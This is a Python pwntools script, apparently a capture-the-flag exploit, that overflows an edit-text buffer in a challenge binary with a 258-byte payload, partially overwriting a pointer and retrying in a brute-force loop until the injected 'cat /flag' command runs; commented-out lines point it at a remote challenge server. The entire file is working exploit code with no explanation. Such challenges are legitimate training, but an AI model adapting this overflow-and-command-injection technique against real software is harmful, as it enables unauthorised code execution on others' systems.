import pwnlib.elf
import pwnlib.rop.rop
import pwnlib.tubes.remote
import pwnlib.context

pwnlib.context.context.clear(arch='amd64', os='linux')

def read_menu(conn):
    for _ in range(4):
        conn.recvline()

# Read the ELF for RDI register ROP
chall = pwnlib.elf.ELF('apps/chall')
libc = pwnlib.elf.ELF('apps/libc-chall.so')

try_counter = 0
while True:
    try_counter += 1
    print("Try number", try_counter)
    # Connect to remote server and get the main address
    #with pwnlib.tubes.remote.remote('ce441-pwn3.pwni.top', 3137) as r:
    #with pwnlib.tubes.remote.remote('localhost', 3137) as r:
    with pwnlib.tubes.process.process('./apps/chall') as r:
        # Goto edit text
        r.sendline(b'1')
        r.recvline() # Welcome text
        read_menu(r) # empty buffer

        # Send payload
        payload = bytearray()
        payload += b'cat /flag '
        payload += ('a' * (255 - len(payload))).encode('ascii')
        payload += b'\0\x20\x50'
        assert len(payload) == 256 + 2
        r.send(payload)

        # Get the result back
        r.recvline() # done
        read_menu(r)
        # Get error message (payloaded!)
        r.sendline(b'4')
        try:
            line = r.recvline()
            if line.startswith(b'> cat /flag '):
                print(line)
                exit()
            else:
                print("Close call:", line)
                continue
        except EOFError:
            continue